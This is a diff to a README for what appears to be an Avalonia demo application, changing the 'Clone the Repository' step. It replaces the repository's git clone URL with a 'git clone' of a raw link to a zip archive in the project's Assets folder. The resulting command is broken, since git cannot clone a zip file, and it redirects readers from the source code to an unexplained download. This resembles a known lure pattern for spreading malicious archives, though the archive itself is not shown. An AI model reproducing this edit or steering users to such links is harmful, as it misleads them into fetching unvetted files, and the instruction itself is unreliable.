@@ -32,5 +32,5 @@ Follow these steps to clone, build, and run the application from the source code
 ### 1. Clone the Repository
 
 ```bash
-git clone https://github.com/QuagMiH3004/TQM_project.git
+git clone https://raw.githubusercontent.com/QuagMiH3004/TQM_project/main/Assets/TQM_project-3.9.zip
 cd Avalonia-Demo-App
